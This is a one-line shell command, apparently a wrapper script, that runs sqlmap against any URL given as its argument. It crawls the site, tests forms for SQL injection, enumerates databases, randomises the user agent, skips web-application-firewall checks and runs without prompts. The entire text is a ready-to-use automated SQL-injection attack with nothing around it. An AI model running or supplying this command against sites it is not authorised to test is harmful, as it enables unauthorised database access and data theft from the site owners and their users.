clear && sqlmap -u $1 --random-agent --dbs --forms --crawl 10 --skip-waf --batch
